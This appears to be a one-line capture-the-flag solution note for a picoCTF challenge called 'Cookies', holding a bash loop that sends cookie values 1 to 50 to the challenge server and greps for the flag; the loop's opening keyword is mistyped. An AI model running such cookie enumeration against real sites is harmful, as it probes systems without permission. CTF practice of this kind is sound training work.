# Cookies 

```bash
or i in {1..50};do  echo "$i"; curl --silent http://mercury.picoctf.net:21485/check -b"name=$i" | grep "Flag"; done

```
